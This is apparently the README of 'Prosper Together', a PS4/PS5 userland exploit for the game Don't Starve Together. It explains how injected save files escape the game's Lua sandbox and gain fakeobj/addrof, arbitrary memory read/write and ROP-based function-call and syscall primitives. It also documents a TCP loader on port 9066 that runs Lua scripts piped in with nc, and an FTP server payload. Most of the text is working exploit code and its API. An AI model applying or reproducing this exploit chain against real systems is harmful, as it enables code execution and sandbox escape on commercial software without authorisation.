# Prosper Together
PS4/PS5 userland exploit for Don't Starve Together (US + EU). Achieves code execution through save file injection, LuaJIT bytecode manipulation, and ROP chains.

## How It Works

1. **Save injection** - `make_save.py` injects Lua code into the `.meta` files of a DST save
2. **Sandbox escape** - The payload is wrapped in `loadstring([[...]])()` which escapes DST's `RunInSandbox` into the global `_G` environment
3. **Primitives** - LuaJIT bytecode manipulation gives `fakeobj`/`addrof`, which bootstrap arbitrary read/write, then ROP-based `call` and `syscall`
4. **TCP loader** - A socket server on port 9066 accepts and executes Lua scripts at runtime

## Quick Start

### Build the save

```bash
cd save-gen
python3 make_save.py
# Output: build_dst/savedata.dat
```

Copy `build_dst/savedata.dat` to USB as:
```
PS5/SAVEDATA/<title_id>/savedata.dat
```

Import the save via PS5 Settings > Saved Data > USB Drive.

### Send payloads at runtime

Once the game boots with the injected save, the TCP loader listens on port 9066. Send any Lua script:

```bash
cat payloads/ftp_server.lua | nc -q 0 <ps5_ip> 9066
```

Or run one-liners:

```bash
echo 'return eboot_base' | nc -q 0 <ps5_ip> 9066
```

## API Reference

All primitives are exported as globals. Send scripts via the TCP loader on port 9066.

### Memory Read

#### `read_bytes_abs(addr, count)` → `table` or `nil`

Read raw bytes from an absolute address. Returns a table of byte values `{b1, b2, ...}` or `nil` on failure.

```lua
local bytes = read_bytes_abs(0x19838000, 4)
-- bytes = {127, 69, 76, 70}  (ELF magic)
```

#### `read_u32_abs(addr)` → `number` or `nil`

Read a 32-bit unsigned integer (little-endian).

```lua
local magic = read_u32_abs(eboot_base)
-- magic = 0x464C457F  (ELF magic)
```

#### `read_u64_abs(addr)` → `lo, hi` or `nil, nil`

Read a 64-bit value as two 32-bit halves.

```lua
local lo, hi = read_u64_abs(eboot_base)
-- lo = lower 32 bits, hi = upper 32 bits
-- full value = hi * 0x100000000 + lo
```

#### `hexread(addr, count)` → `string`

Hex dump of memory. Returns space-separated hex bytes or `"ERR"`.

```lua
local dump = hexread(eboot_base, 16)
-- "7f 45 4c 46 02 01 01 09 00 00 00 00 00 00 00 00"
```

### Memory Write

#### `write_double(addr, value)` → `boolean`

Write an 8-byte IEEE 754 double to an address. The `value` must be a Lua number. Returns `true` on success.

```lua
write_double(some_addr, 0)       -- write 8 zero bytes (0.0 as double)
write_double(some_addr, 1.5)     -- write the double 1.5
```

> **Note**: This writes a double-precision float, not a raw integer. To write raw byte patterns, use `fakeobj` to craft a value with the desired bit representation, then pass it to `write_double`.

#### `get_str_addr(s)` → `number`

Get the memory address of a Lua string's `GCstr` object. The actual string content starts at offset +24.

```lua
local buf = string.rep("\0", 256)
local buf_addr = get_str_addr(buf) + 24  -- pointer to 256 zero bytes
```

This is the primary way to allocate memory buffers for syscalls:

```lua
-- Allocate a buffer and get its address
local my_buf = string.rep("\0", 4096)
local my_buf_ptr = get_str_addr(my_buf) + 24

-- Use as a syscall argument
syscall(3, fd, my_buf_ptr, 4096)  -- read(fd, buf, 4096)
```

### Object Manipulation

#### `addrof(obj)` → `number` or `nil`

Get the memory address of a Lua object (table, function, userdata, etc.).

```lua
local addr = addrof(TheNet)
-- addr = 0x12345678
```

#### `fakeobj(hi32, addr)` → `value` or `nil`

Create a fake Lua value from raw tagged pointer components. `hi32` is the upper 32 bits (type tag), `addr` is the lower 32 bits (pointer).

```lua
-- Create a fake string object at address 0xDEADBEEF
local fake_str = fakeobj(0xFFFD8000, 0xDEADBEEF)

-- Create a fake table object
local fake_tab = fakeobj(0xFFFA0000, some_addr)
```

Common type tags:
| Tag | Type |
|-----|------|
| `0xFFFD8000` | string |
| `0xFFFA0000` | table |
| `0` | lightuserdata / number (low bits) |

### Calling Functions

#### `call(func_lo, func_hi, a1, a2, a3, a4, a5, a6)` → `ret_lo, ret_hi`

Call an arbitrary function at an absolute address. Up to 6 arguments (rdi, rsi, rdx, rcx, r8, r9). Arguments and return value are split into 32-bit lo/hi pairs. Pass 64-bit arguments as `{lo, hi}` tables.

```lua
-- Call a function at a known address
local ret_lo, ret_hi = call(func_lo, func_hi, arg1, arg2)

-- Example: call memcpy(dst, src, len)
local memcpy_lo = libc_base_lo + 0x32600
local memcpy_hi = libc_base_hi
call(memcpy_lo, memcpy_hi, dst_addr, src_addr, length)

-- Example: call a function with 6 args
local ret_lo, ret_hi = call(func_lo, func_hi, a1, a2, a3, a4, a5, a6)
```

### Syscalls

#### `syscall(num, a1, a2, a3, a4, a5, a6)` → `ret_lo, ret_hi`

Execute a FreeBSD syscall with up to 6 arguments. Returns raw result; `ret_lo >= 0x80000000` indicates error (returned -1 from kernel).

```lua
-- getpid (syscall 20)
local pid = syscall(20)

-- open (syscall 5)
local path = "/dev/notification0\0"
local path_addr = get_str_addr(path) + 24
local fd = syscall(5, path_addr, 0, 0)  -- open(path, O_RDONLY, 0)

-- read (syscall 3)
local buf = string.rep("\0", 256)
local buf_addr = get_str_addr(buf) + 24
local n = syscall(3, fd, buf_addr, 256)

-- write (syscall 4)
local msg = "hello\n"
local msg_addr = get_str_addr(msg) + 24
syscall(4, fd, msg_addr, #msg)

-- close (syscall 6)
syscall(6, fd)

-- socket (syscall 97)
local sock = syscall(97, 2, 1, 0)  -- AF_INET, SOCK_STREAM, 0

-- setsockopt (5 args)
local enable = "\x01\x00\x00\x00\x00\x00\x00\x00"
local enable_ptr = get_str_addr(enable) + 24
syscall(105, sock_fd, 0xFFFF, 4, enable_ptr, 4)

-- mmap (6 args)
local addr_lo, addr_hi = syscall(477, 0, 0x4000, 3, 0x1022, -1, 0)
```

Common syscall numbers:
| Number | Name |
|--------|------|
| 3 | read |
| 4 | write |
| 5 | open |
| 6 | close |
| 20 | getpid |
| 30 | accept |
| 37 | kill |
| 97 | socket |
| 104 | bind |
| 105 | setsockopt |
| 106 | listen |
| 188 | stat |
| 209 | poll |
| 272 | getdents |
| 477 | mmap |

### Error Checking

Syscall errors return -1 (the libkernel stub handles the carry flag). In practice, check `ret_lo >= 0x80000000`:

```lua
local fd = syscall(5, path_addr, 0, 0)
if not fd or fd >= 0x80000000 then
    -- error
end
```

### Notifications

#### `notify(message)`

Send a PS5 system notification popup.

```lua
notify("Hello from Lua!")
```

### Logging

#### `rlog(tag, message)`

Log to the in-game announcement bar and TCP socket (if connected).

```lua
rlog("info", "something happened")
-- shows: [info] something happened
```

#### `prosper_log(message)`

Log to the on-screen Prosper Together console.

```lua
prosper_log("FTP server started on port 1337")
```

### Globals

| Global | Type | Description |
|--------|------|-------------|
| `eboot_base` | number | Base address of the game executable |
| `region` | string | `"US"` or `"EU"` |
| `libc_base_lo` | number | libc base address (low 32 bits) |
| `libc_base_hi` | number | libc base address (high 32 bits) |
| `libkernel_base_lo` | number | libkernel base (low 32 bits) |
| `libkernel_base_hi` | number | libkernel base (high 32 bits) |
| `syscall_lo` | number | Raw syscall stub address (low 32 bits) |
| `syscall_hi` | number | Raw syscall stub address (high 32 bits) |
| `my_ip` | string | Detected PS5 IP address (e.g. `"192.168.0.101"`) |

### Utility

#### `Shutdown()`

Kill the game process (calls `kill(getpid(), SIGKILL)`).

```lua
Shutdown()
```

## Payloads

### FTP Server (`payloads/ftp_server.lua`)

Full FTP server on port 1337. Connect with any FTP client (FileZilla, lftp, etc).

```bash
cat payloads/ftp_server.lua | nc -q 0 <ps5_ip> 9066
```

FileZilla setup: Site Manager > General > Encryption: "Only use plain FTP (insecure)"

Supports: `USER`, `PASS`, `PWD`, `CWD`, `CDUP`, `LIST`, `RETR`, `STOR`, `PASV`, `PORT`, `TYPE`, `SIZE`, `DELE`, `MKD`, `RMD`, `RNFR`, `RNTO`, `REST`, `SITE CHMOD`, `FEAT`, `SYST`, `QUIT`

## Full Example

```lua
-- Read ELF header
local magic = hexread(eboot_base, 16)
prosper_log("ELF: " .. magic)

-- Get PID
local pid = syscall(20)
prosper_log("PID: " .. tostring(pid))

-- Read a file
local path = "/savedata0/savedata.dat\0"
local path_ptr = get_str_addr(path) + 24
local fd = syscall(5, path_ptr, 0, 0)
if fd and fd < 0x80000000 then
    local buf = string.rep("\0", 128)
    local buf_ptr = get_str_addr(buf) + 24
    local n = syscall(3, fd, buf_ptr, 128)
    prosper_log("Read " .. tostring(n) .. " bytes")
    prosper_log(hexread(buf_ptr, 32))
    syscall(6, fd)
end

-- Send a notification
notify("Exploit running! PID=" .. tostring(pid))
```

## Credits

by earthonion
